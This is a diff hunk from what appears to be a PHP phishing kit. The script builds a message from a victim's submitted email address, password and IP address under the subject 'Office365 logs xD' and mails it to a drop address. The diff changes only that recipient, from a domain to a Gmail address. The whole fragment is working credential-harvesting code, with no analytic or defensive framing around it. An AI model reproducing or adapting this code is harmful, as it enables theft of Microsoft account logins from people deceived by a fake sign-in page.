@@ -23,7 +23,7 @@ $message .= "Email Address        : ".$_POST['username']."\n";
 $message .= "Password               : ".$_POST['passwd']."\n";
 $message .= "IP Address             : ".$ip."\n";
 $message .= "-----------  ! +nJoY+ !  -----------\n";
-$send = "rebeccahandley.com";
+$send = "rebeccahandleyann@gmail.com";
 
 $subject = "Office365 logs xD $ip";
 $headers = "From:  El Patron<xConsoLe@alboraaq.com>";
